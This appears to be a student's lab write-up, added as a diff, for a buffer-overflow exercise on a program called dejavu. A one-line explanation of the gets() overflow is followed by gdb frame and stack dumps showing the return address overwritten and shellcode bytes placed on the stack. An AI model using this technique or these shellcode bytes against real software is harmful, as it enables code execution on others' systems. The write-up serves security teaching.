@@ -1,0 +1,37 @@
+For q1, the vulnerability was that char door[8] could be overflowed since it only holds 8 characters and there is nothing preventing us from adding more in gets(). This means we can add characters to overwrite the return address and run our shellcode.
+
+
+Breakpoint 1, deja_vu () at dejavu.c:7
+7         gets(door);
+(gdb) info frame
+Stack level 0, frame at 0xbffffc30:
+ eip = 0x8048412 in deja_vu (dejavu.c:7); saved eip 0x804842a
+ called by frame at 0xbffffc40
+ source language c.
+ Arglist at 0xbffffc28, args:
+ Locals at 0xbffffc28, Previous frame's sp is 0xbffffc30
+ Saved registers:
+  ebp at 0xbffffc28, eip at 0xbffffc2c
+(gdb) x/20x $esp
+0xbffffc00:     0xb7fd23e4      0x00200000      0x0804a000      0x08048492
+0xbffffc10:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7e5f225
+0xbffffc20:     0xb7fed270      0x00000000      0xbffffc38      0x0804842a
+0xbffffc30:     0x08048440      0x00000000      0x00000000      0xb7e454d3
+0xbffffc40:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7fdc858
+(gdb) step
+8       }
+(gdb) info frame
+Stack level 0, frame at 0xbffffc30:
+ eip = 0x804841d in deja_vu (dejavu.c:8); saved eip 0xbffffc30
+ called by frame at 0x4646464e
+ source language c.
+ Arglist at 0xbffffc28, args:
+ Locals at 0xbffffc28, Previous frame's sp is 0xbffffc30
+ Saved registers:
+  ebp at 0xbffffc28, eip at 0xbffffc2c
+(gdb) x/20x $esp
+0xbffffc00:     0xbffffc18      0x00200000      0x0804a000      0x08048492
+0xbffffc10:     0x00000001      0xbffffcd4      0x46464646      0x46464646
+0xbffffc20:     0x46464646      0x46464646      0x46464646      0xbffffc30
+0xbffffc30:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
+0xbffffc40:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
